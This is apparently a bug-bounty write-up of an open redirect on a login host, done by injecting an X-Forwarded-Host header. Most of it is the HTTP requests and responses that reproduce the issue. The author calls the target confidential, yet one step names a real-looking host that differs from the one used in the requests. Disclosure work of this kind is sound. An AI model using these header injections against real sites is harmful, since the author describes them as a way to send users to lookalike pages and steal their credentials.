# Open-redirect-On-XYZ.com-Via-X-Forwarded-Host-Header
xyz.com is the made up website domain of a company I found the vulnerability on Hackerone , will keep the real name confidential.

# Description
I noticed that the below requests was vulnerable to an open redirect via the host header injection, because the url redirection link is gotten from the host header value and it is not verified thus allowing me to redirect a user to another website similar to the login page and steal user credentials.


Request
```plaintext
GET /login HTTP/1.1
Host: atlas.xyz.tools
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://atlas.xyz.tools/
Connection: close
-----------snip---------------------------
Response
-------------------snip--------------------------
<html><body>You are being <a href="https://atlas.xyz.tools/auth/saml?redirectUrl=https://atlas.xyz.tools">redirected</a>.</body></html>

```

# Steps To Reproduce

I will be using google.com and facebook.com as an example of a malicious hacker website.

STEP 1 : Visit atlas.instacart.com and capture the request below with burpsuite and send to the repeater.
```plaintext
GET /login HTTP/1.1
Host: atlas.xyz.tools
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://atlas.xyz.tools/
Connection: close
-----------snip---------------------------
```
STEP 2: Modify the request by adding X-Forwarded-Host: facebook.com or google.com.

Note: This can also be done by modifying the Host header value but when X-Forwarded-Host Header is present within the request, the redirect url is gotten from the value of the X-Forwarded-Host Header instead of the Host Header.


The request when modified should be as this below :
```plaintext
GET /login HTTP/1.1
Host: atlas.xyz.tools
X-Forwarded-Host: facebook.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://atlas.xyz.tools/
Connection: close
-----------snip---------------------------
send the request via the repeater , response should be
-----------snip-------------------------------
<html><body>You are being <a href="https://facebook.com/auth/saml?redirectUrl=https://facebook.com">redirected</a>.</body></html>
```

Following the redirection.......
```plaintext
GET /auth/saml?redirectUrl=https://facebook.com HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://atlas.xyz.tools/
Connection: close
Upgrade-Insecure-Requests: 1
Host: facebook.com
```

Another request I was able to get a redirect easily was with the request below
```plaintext
GET / HTTP/1.1
Host: atlas.xyz.tools
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Forwarded-Host: facebook.com
--------------------snip------------------------
```
Response
```plaintext
------------------snip--------------------------------------
<a class="btn btn-primary btn-lg" role="button" id="sign_in" href="https://facebook.com/login">Sign in</a>
```

